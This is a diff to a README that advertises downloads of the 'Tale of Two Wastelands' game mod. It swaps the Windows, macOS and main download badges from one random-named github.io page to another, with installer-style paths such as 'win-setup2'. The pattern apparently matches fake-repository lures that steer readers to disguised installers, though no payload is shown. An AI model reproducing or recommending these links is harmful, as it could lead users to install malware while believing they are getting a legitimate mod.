@@ -30,7 +30,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Tale of Two Wastelands](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TALE_OF_TWO_WASTELANDS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download Tale of Two Wastelands](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TALE_OF_TWO_WASTELANDS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -76,8 +76,8 @@ Getting started with **Tale of Two Wastelands** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-8D6E63?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-8D6E63?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-8D6E63?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-8D6E63?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 </div>
 
